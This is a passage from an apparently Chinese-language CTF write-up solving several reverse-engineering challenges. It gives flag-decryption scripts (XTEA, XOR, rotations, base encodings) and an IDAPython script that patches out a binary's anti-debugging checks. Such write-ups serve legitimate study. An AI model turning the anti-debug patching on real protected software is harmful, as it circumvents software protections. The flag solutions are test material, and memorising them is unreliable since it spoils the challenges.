class="line">        <span class="built_in">sum</span> &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (<span class="built_in">sum</span> + k[<span class="built_in">sum</span> &amp; <span class="number">3</span>])</span><br><span class="line">        v0 &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&#x27;&gt;2I&#x27;</span>, v0, v1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    encoded_flag = <span class="string">b&quot;vBzX30Koxl3HpDaYaFJKhyB/1ckuVCnc4wZhrwUWeNuZkAxr+Qn5UaYbpvymmCrk&quot;</span></span><br><span class="line">    xtea_key = <span class="string">b&quot;geek2025reverse!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. Base64 decode</span></span><br><span class="line">    base64_decoded = base64.b64decode(encoded_flag)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. XOR with 0x5A</span></span><br><span class="line">    xored_data = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> base64_decoded:</span><br><span class="line">        xored_data.append(byte ^ <span class="number">0x5A</span>)</span><br><span class="line">    <span class="comment"># 3. XTEA decrypt</span></span><br><span class="line">    decrypted_flag = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(xored_data), <span class="number">8</span>):</span><br><span class="line">        block = <span class="built_in">bytes</span>(xored_data[i:i+<span class="number">8</span>])</span><br><span class="line">        decrypted_block = xtea_decrypt(block, xtea_key)</span><br><span class="line">        decrypted_flag += decrypted_block</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Remove padding</span></span><br><span class="line">    padding_len = decrypted_flag[-<span class="number">1</span>]</span><br><span class="line">    flag = decrypted_flag[:-padding_len]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><h3 id="re-ez-pyyy"><a href="#re-ez-pyyy" class="headerlink" title="re-ez_pyyy"></a>re-ez_pyyy</h3><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106212444957.png"></p><p>在线网站反编译</p><p>解密脚本如下</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">cipher = [</span><br><span class="line"> <span class="number">48</span>,<span class="number">55</span>,<span class="number">57</span>,<span class="number">50</span>,<span class="number">53</span>,<span class="number">55</span>,<span class="number">53</span>,<span class="number">50</span>,<span class="number">52</span>,<span class="number">50</span>,<span class="number">48</span>,<span class="number">55</span>,<span class="number">101</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">50</span>,</span><br><span class="line"> <span class="number">52</span>,<span class="number">50</span>,<span class="number">52</span>,<span class="number">50</span>,<span class="number">48</span>,<span class="number">55</span>,<span class="number">53</span>,<span class="number">55</span>,<span class="number">55</span>,<span class="number">55</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">53</span>,<span class="number">55</span>,<span class="number">54</span>,<span class="number">55</span>,</span><br><span class="line"> <span class="number">55</span>,<span class="number">55</span>,<span class="number">53</span>,<span class="number">54</span>,<span class="number">98</span>,<span class="number">55</span>,<span class="number">97</span>,<span class="number">54</span>,<span class="number">50</span>,<span class="number">53</span>,<span class="number">56</span>,<span class="number">52</span>,<span class="number">50</span>,<span class="number">52</span>,<span class="number">99</span>,<span class="number">54</span>,</span><br><span class="line"> <span class="number">50</span>,<span class="number">50</span>,<span class="number">52</span>,<span class="number">50</span>,<span class="number">50</span>,<span class="number">54</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">en33_right_rotate</span>(<span class="params">data: <span class="built_in">bytes</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    bit_len = <span class="built_in">len</span>(data) * <span class="number">8</span></span><br><span class="line">    n = n % bit_len</span><br><span class="line">    val = <span class="built_in">int</span>.from_bytes(data, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    val = (val &gt;&gt; n) | ((val &lt;&lt; (bit_len - n)) &amp; ((<span class="number">1</span> &lt;&lt; bit_len) - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> val.to_bytes(<span class="built_in">len</span>(data), <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap_nibbles</span>(<span class="params">b: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> ((b &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xF0</span>) | ((b &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 从 cipher 列表恢复 ASCII 十六进制字符串</span></span><br><span class="line">hex_ascii = <span class="built_in">bytes</span>(cipher).decode()  <span class="comment"># -&gt; &#x27;079257524207e45242420757772657677756b7a6258424c6224226&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 十六进制转字节</span></span><br><span class="line">data = <span class="built_in">bytes</span>.fromhex(hex_ascii)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 逆 en33：整体右旋 32 位</span></span><br><span class="line">data = en33_right_rotate(data, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 逆 en3（每字节交换高低 4 位）</span></span><br><span class="line">data = <span class="built_in">bytes</span>([swap_nibbles(b) <span class="keyword">for</span> b <span class="keyword">in</span> data])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 逆 XOR(key=17)</span></span><br><span class="line">data = <span class="built_in">bytes</span>([b ^ <span class="number">17</span> <span class="keyword">for</span> b <span class="keyword">in</span> data])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;中间解（可能还需反转）:&quot;</span>, data)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;中间解 utf-8:&quot;</span>, data.decode())</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;不能直接 utf-8 解码:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 根据原代码可疑的切片，尝试反转一次</span></span><br><span class="line">final = data[::-<span class="number">1</span>].decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;最终 flag:&quot;</span>, final)</span><br></pre></td></tr></table></figure></div><h3 id="re-only-flower"><a href="#re-only-flower" class="headerlink" title="re-only_flower"></a>re-only_flower</h3><p>去花之后</p><p><img lazyload src="/images/loading.svg" data-src="C:\Users\19124\AppData\Roaming\Typora\typora-user-images\image-20251106212814810.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106212927919.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106213053199.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106213233695.png"></p><p>解密脚本如下</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">rol8</span><span class="params">(<span class="type">uint8_t</span> value, <span class="type">int</span> shift)</span> &#123;</span><br><span class="line">	shift %= <span class="number">8</span>;</span><br><span class="line">	<span class="keyword">if</span> (shift &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		shift += <span class="number">8</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (value &lt;&lt; shift) | (value &gt;&gt; (<span class="number">8</span> - shift));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> a[]=&#123;<span class="number">0x0A</span>, <span class="number">0x84</span>, <span class="number">0xC2</span>, <span class="number">0x84</span>, <span class="number">0x51</span>, <span class="number">0x48</span>, <span class="number">0x5F</span>, <span class="number">0xF2</span>, <span class="number">0x9E</span>, <span class="number">0x8D</span>, </span><br><span class="line">		<span class="number">0xD0</span>, <span class="number">0x84</span>, <span class="number">0x75</span>, <span class="number">0x67</span>, <span class="number">0x73</span>, <span class="number">0x8F</span>, <span class="number">0xCA</span>, <span class="number">0x57</span>, <span class="number">0xD7</span>, <span class="number">0xE6</span>, </span><br><span class="line">		<span class="number">0x14</span>, <span class="number">0x6E</span>, <span class="number">0x77</span>, <span class="number">0xE2</span>, <span class="number">0x29</span>, <span class="number">0xFE</span>, <span class="number">0xDF</span>, <span class="number">0xCC</span>&#125;;</span><br><span class="line">	<span class="type">int</span> flag;</span><br><span class="line">	<span class="type">char</span> KEY[]=<span class="string">&quot;GEEK2025&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">28</span>; ++i )&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">128</span>;j++)&#123;</span><br><span class="line">		flag=j;</span><br><span class="line">		<span class="keyword">if</span>( a[i]== i + rol8(KEY[i % <span class="number">8</span>] ^ flag, KEY[i % <span class="number">8</span>] &amp; <span class="number">7</span>))</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,flag);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="re-ezRu3t"><a href="#re-ezRu3t" class="headerlink" title="re-ezRu3t"></a>re-ezRu3t</h3><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106213529119.png"></p><p>在字符表里先找到了base64和base85的表</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106214033920.png"></p><p>先进行base64</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106214231727.png"></p><p>再进行base85</p><p>主要是密文找了一会，最后在qword_14001E96B找到了</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106214509243.png"></p><p>cyberchef一把梭</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106214549356.png"></p><h3 id="re-ezSMC"><a href="#re-ezSMC" class="headerlink" title="re-ezSMC"></a>re-ezSMC</h3><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106215008056.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106215027613.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106215120468.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106215302144.png"></p><p>先rc4加密，密钥为0x11，再字符串转十六进制，再base64加密，再进行base58加密，直接cyberchef一把梭</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106215622100.png"></p><h3 id="re-Her"><a href="#re-Her" class="headerlink" title="re-Her"></a>re-Her</h3><p>这题主要是卡在反调试，编写idapyhton代码过掉反调试，然后动态调试一步步跟</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> ida_auto</span><br><span class="line"><span class="keyword">import</span> ida_ua</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：这些地址必须和你当前 IDB 中的实际函数地址一致（无重定位偏移）</span></span><br><span class="line">ADDR_SUB_8F1530 = <span class="number">0x008F1530</span>  <span class="comment"># sub_8F1530 / sub_8F10CD</span></span><br><span class="line">ADDR_SUB_8F3380 = <span class="number">0x008F3380</span>  <span class="comment"># sub_8F3380 - CRT IsDebuggerPresent guard (你之前脚本中的注释)</span></span><br><span class="line">ADDR_SUB_8F3860 = <span class="number">0x008F3860</span>  <span class="comment"># sub_8F3860 - fastfail wrapper #1</span></span><br><span class="line">ADDR_SUB_8F39C0 = <span class="number">0x008F39C0</span>  <span class="comment"># sub_8F39C0 - fastfail wrapper #2</span></span><br><span class="line">ADDR_SUB_8F47B0 = <span class="number">0x008F47B0</span>  <span class="comment"># sub_8F47B0 - exception-filter anti-debug core</span></span><br><span class="line"></span><br><span class="line">ADDR_DWORD_8FB1D8 = <span class="number">0x008FB1D8</span></span><br><span class="line">XOR_KEY_8FB1D8    = <span class="number">0x001A373</span>  <span class="comment"># 0x17DDE ^ 0x0DEAD</span></span><br><span class="line"></span><br><span class="line">STUB_LEN = <span class="number">16</span>  <span class="comment"># 每个 stub 覆盖的长度</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_ret_stub</span>(<span class="params">ret_val: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    通用空壳：</span></span><br><span class="line"><span class="string">        push ebp</span></span><br><span class="line"><span class="string">        mov  ebp, esp</span></span><br><span class="line"><span class="string">        xor eax, eax / mov eax, imm32</span></span><br><span class="line"><span class="string">        leave</span></span><br><span class="line"><span class="string">        retn</span></span><br><span class="line"><span class="string">        nop 填充</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    stub = <span class="built_in">bytearray</span>(<span class="string">b&quot;\x55\x8B\xEC&quot;</span>)  <span class="comment"># push ebp; mov ebp, esp</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ret_val == <span class="number">0</span>:</span><br><span class="line">        stub += <span class="string">b&quot;\x31\xC0&quot;</span>            <span class="comment"># xor eax, eax</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        stub += <span class="string">b&quot;\xB8&quot;</span> + (ret_val &amp; <span class="number">0xFFFFFFFF</span>).to_bytes(<span class="number">4</span>, <span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line">    stub += <span class="string">b&quot;\xC9\xC3&quot;</span>                <span class="comment"># leave; retn</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(stub) &gt; STUB_LEN:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;ret stub length exceeds padding space&quot;</span>)</span><br><span class="line"></span><br><span class="line">    stub.extend(<span class="string">b&quot;\x90&quot;</span> * (STUB_LEN - <span class="built_in">len</span>(stub)))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(stub)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_sub_8F1530_stub</span>() -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    模拟 sub_8F1530 在「真实安全环境」中的行为：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      - CheckRemoteDebuggerPresent 报告无远程调试器时，原代码会：</span></span><br><span class="line"><span class="string">            dword_8FB1D8 ^= 0x17DDE;</span></span><br><span class="line"><span class="string">            dword_8FB1D8 ^= 0x0DEAD;   // 合成 ^= 0x1A373</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      - Sleep / GetTickCount 检查不过阈值 → 返回 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    在无调试器的理想环境里，每次调用这个函数：</span></span><br><span class="line"><span class="string">      * 返回值为 0（“一切正常，可以走真实加密路径”）</span></span><br><span class="line"><span class="string">      * 并对 dword_8FB1D8 做一次 ^= 0x1A373（原始代码确实是每次调用都可能 XOR，没有只一次的保护）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    我们用一个紧凑 stub 表达：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        xor dword ptr [ADDR_DWORD_8FB1D8], XOR_KEY_8FB1D8</span></span><br><span class="line"><span class="string">        xor eax, eax</span></span><br><span class="line"><span class="string">        retn</span></span><br><span class="line"><span class="string">        nop ...</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    stub = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 81 35 &lt;addr32&gt; &lt;imm32&gt;  -&gt; xor dword ptr [addr], imm32</span></span><br><span class="line">    stub += <span class="string">b&quot;\x81\x35&quot;</span></span><br><span class="line">    stub += ADDR_DWORD_8FB1D8.to_bytes(<span class="number">4</span>, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    stub += XOR_KEY_8FB1D8.to_bytes(<span class="number">4</span>, <span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line">    stub += <span class="string">b&quot;\x31\xC0&quot;</span>  <span class="comment"># xor eax, eax</span></span><br><span class="line">    stub += <span class="string">b&quot;\xC3&quot;</span>      <span class="comment"># retn</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(stub) &gt; STUB_LEN:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;sub_8F1530 stub length exceeds padding space&quot;</span>)</span><br><span class="line"></span><br><span class="line">    stub.extend(<span class="string">b&quot;\x90&quot;</span> * (STUB_LEN - <span class="built_in">len</span>(stub)))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(stub)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">apply_stub</span>(<span class="params">addr: <span class="built_in">int</span>, stub: <span class="built_in">bytes</span>, description: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ida_bytes.is_mapped(addr):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] <span class="subst">&#123;addr:#x&#125;</span> not mapped, skip <span class="subst">&#123;description&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    ida_bytes.del_items(addr, ida_bytes.DELIT_SIMPLE, <span class="built_in">len</span>(stub))</span><br><span class="line">    ida_bytes.patch_bytes(addr, stub)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重建指令：按长度往后走，避免用不存在的 next_head</span></span><br><span class="line">    ea = addr</span><br><span class="line">    end = addr + <span class="built_in">len</span>(stub)</span><br><span class="line">    <span class="keyword">while</span> ea &lt; end:</span><br><span class="line">        insn_len = ida_ua.create_insn(ea)</span><br><span class="line">        <span class="keyword">if</span> insn_len &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 如果这儿 IDA 没识别出指令（比如连续 NOP），就手动 +1</span></span><br><span class="line">            ea += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ea += insn_len</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Patched <span class="subst">&#123;description&#125;</span> at <span class="subst">&#123;addr:#x&#125;</span>, size=<span class="subst">&#123;<span class="built_in">len</span>(stub)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># 1) sub_8F1530: 既更新 key，又保证返回 0 → 强制走真实加密 SEH 路径，不走 rand 假分支</span></span><br><span class="line">    apply_stub(</span><br><span class="line">        ADDR_SUB_8F1530,</span><br><span class="line">        make_sub_8F1530_stub(),</span><br><span class="line">        <span class="string">&quot;sub_8F1530 / sub_8F10CD - anti-debug dispatcher (real-env key schedule)&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2) 其它反调试/异常封装：在真实环境中等价于“没触发”，统一返回 0</span></span><br><span class="line">    apply_stub(</span><br><span class="line">        ADDR_SUB_8F3380,</span><br><span class="line">        make_ret_stub(<span class="number">0</span>),</span><br><span class="line">        <span class="string">&quot;sub_8F3380 - CRT IsDebuggerPresent guard&quot;</span></span><br><span class="line">    )</span><br><span class="line">    apply_stub(</span><br><span class="line">        ADDR_SUB_8F3860,</span><br><span class="line">        make_ret_stub(<span class="number">0</span>),</span><br><span class="line">        <span class="string">&quot;sub_8F3860 - fastfail wrapper #1&quot;</span></span><br><span class="line">    )</span><br><span class="line">    apply_stub(</span><br><span class="line">        ADDR_SUB_8F39C0,</span><br><span class="line">        make_ret_stub(<span class="number">0</span>),</span><br><span class="line">        <span class="string">&quot;sub_8F39C0 - fastfail wrapper #2&quot;</span></span><br><span class="line">    )</span><br><span class="line">    apply_stub(</span><br><span class="line">        ADDR_SUB_8F47B0,</span><br><span class="line">        make_ret_stub(<span class="number">0</span>),</span><br><span class="line">        <span class="string">&quot;sub_8F47B0 - exception-filter anti-debug core&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    ida_auto.auto_wait()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Anti-debug stubs applied with real-environment semantics for encryption logic.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><p>加密流程主要在这</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251108215623877.png"></p><p>通过输入不断验证</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> a[]=<span class="string">&quot;1234567890123456789012345678901&quot;</span>;</span><br><span class="line">	<span class="type">int</span> flag[<span class="number">32</span>];</span><br><span class="line"><span class="comment">//int a[]=&#123;0x2D, 0x4F, 0x69, 0x3D, 0x5F, 0x01, 0xBD, 0x9F, 0xA4, 0x6D, 0x89, 0xAE, 0x2A, 0xEA, 0xD1, 0x9C, 0x71, 0x6D, 0xE1, 0x1E, 0x38, 0x7E, 0x8C, 0x0A, 0xCE, 0x6B, 0xE0, 0xF7, 0x36, 0x72, 0x99&#125;;</span></span><br><span class="line">	<span class="type">int</span> b=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">31</span>;i++)&#123;</span><br><span class="line">		b^=<span class="number">0x1A373</span>;</span><br><span class="line">		<span class="comment">//printf(&quot;%x\n&quot;,b);</span></span><br><span class="line">		a[i]=(++b%<span class="number">0x100</span>)^a[i]^<span class="number">0xAA</span>;</span><br><span class="line">		<span class="comment">//printf(&quot;%x\n&quot;,a[i]);</span></span><br><span class="line">		b^=<span class="number">0x1A373</span>;</span><br><span class="line">		a[i]+=++b%<span class="number">0x100</span>+i*i;</span><br><span class="line">		<span class="comment">//printf(&quot;%x\n&quot;,a[i]);</span></span><br><span class="line">		b^=<span class="number">0x1A373</span>;</span><br><span class="line">		b++;</span><br><span class="line">		b^=<span class="number">0x1A373</span>;</span><br><span class="line">		<span class="comment">//printf(&quot;%x\n&quot;,b);</span></span><br><span 